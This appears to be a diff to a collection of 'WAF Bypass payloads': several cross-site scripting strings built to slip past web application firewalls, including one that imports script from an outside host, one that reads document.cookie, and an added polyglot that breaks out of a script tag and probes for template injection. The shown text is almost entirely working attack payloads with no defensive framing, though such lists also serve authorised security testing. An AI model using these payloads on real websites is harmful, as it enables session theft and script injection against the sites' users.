@@ -6,7 +6,7 @@ WAF Bypass payloads :
 <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 "><details/open/id="&quot;"ontoggle=alert(1)>
 <img src="X" onerror=top[8680439..toString(30)](1337+document.cookie)>
-
+'"></script><img src=x onerror=alert(1)>{{'7'*7}}
 
 <Svg Only=1 OnLoad=confirm(document.domain)>
 <Svg/OnLoad=alert(1337)>"@gmail.com
